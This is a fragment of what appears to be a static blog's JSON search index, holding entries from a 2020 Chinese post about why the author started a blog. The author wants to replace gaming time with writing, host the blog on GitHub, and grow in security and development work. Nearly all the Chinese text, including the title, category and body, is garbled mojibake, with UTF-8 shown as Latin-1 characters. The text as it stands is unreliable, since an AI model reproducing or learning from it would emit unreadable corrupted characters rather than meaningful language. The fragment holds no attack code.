","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:2:2","series":null,"tags":["Life","Blog"],"title":"ä¸ºä»€ä¹ˆæƒ³è¦å†™åšå®¢","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#åšå®¢çš„ç›®çš„"},{"categories":["æ–‡å­—"],"content":"å¯¹è‡ªå·±çš„è¦æ±‚ è¶ç€æœ€è¿‘è¯¾ä¸šä»»åŠ¡ä¸å¤šï¼Œå®éªŒå®¤é¡¹ç›®è¿›åº¦è¦æ±‚ä¹Ÿä¸ç®—å¤ªæ€¥ï¼Œæ‰€ä»¥å°†è‡ªå·±çš„åšå®¢å¼€ä¸ªå¤´ã€‚ ç°åœ¨çš„æˆ‘ä¹Ÿæ— æ³•ç¡®å®šèƒ½å¤Ÿå°†å†™åšå®¢è¿™ä¸ªæ´»åŠ¨ä¿æŒå¤šä¹…(å› ä¸ºæˆ‘çœŸçš„è§‰å¾—ç›®å‰çš„è‡ªå·±æ˜¯ä¸€ä¸ªè‡ªæ§èƒ½åŠ›å¾ˆå·®çš„äºº)ï¼Œä½†æˆ‘å¯¹è‡ªå·±çš„æ”¹å˜æ˜¯æŠ±æœ‰ä¿¡å¿ƒçš„ã€‚æ—¢ç„¶ä»¥å‰å¾—æˆ‘æ€»æ˜¯èƒ½å¤Ÿæ‰¾åˆ°ç©æ¸¸æˆçš„æ—¶é—´ï¼Œé‚£ä¹ˆå°†è¿™ä¸ªæ—¶é—´ç”¨äºå†™åšå®¢ï¼Œå¤±å»çš„æ˜¯ç©æ¸¸æˆæ—¶çš„æµ®èºå¿ƒæ€å’Œæ¸´æœ›è·å¾—å¿«æ„Ÿçš„ä¸å¥åº·å¿ƒæƒ…ï¼Œè·å¾—çš„æ˜¯å¯¹è‡ªå·±çµé­‚çš„è°ƒèŠ‚å’Œæ”¾æ¾ï¼Œå²‚ä¸æ˜¯ç¾äº‹ä¸€æ¡© ï¼šï¼‰ æš‚ä¸”å…ˆå°†è¿™ä¸ªåšå®¢æ”¾åœ¨githubä¸Šï¼Œç­‰ä»¥åå†ä¹°ä¸ªæœåŠ¡å™¨å’ŒåŸŸåï¼Œå°†åšå®¢é•¿ä¹…ä¿ç•™ä¸‹å»ã€‚ æˆ‘çš„ç›®æ ‡æ˜¯èƒ½å†™å¤šä¹…å°±å†™å¤šä¹…ï¼Œå¹¶ä¸”æˆä¸ºå®‰å…¨/å¼€å‘è¡Œä¸šçš„ä¸Šæ¸¸é€‰æ‰‹ã€‚ ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:3:0","series":null,"tags":["Life","Blog"],"title":"ä¸ºä»€ä¹ˆæƒ³è¦å†™åšå®¢","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#å¯¹è‡ªå·±çš„è¦æ±‚"}]